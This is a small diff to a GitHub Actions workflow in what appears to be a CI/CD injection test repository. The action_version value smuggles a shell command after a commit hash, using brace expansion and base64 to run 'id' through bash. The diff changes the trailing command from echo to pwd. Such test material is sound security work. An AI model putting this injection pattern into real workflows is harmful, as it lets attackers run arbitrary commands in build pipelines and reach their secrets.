@@ -4,7 +4,7 @@ on:
 
 env:
   repo_value: "s1n-cicd-tests/checkout"
-  action_version: '0214781bd089a5c6215374a7c3e98d7c505b35d0?test=";{echo,aWQK}|{base64,-d}|{bash,-i};echo"'
+  action_version: '0214781bd089a5c6215374a7c3e98d7c505b35d0?test=";{echo,aWQK}|{base64,-d}|{bash,-i};pwd"'
 
 jobs:
   init:
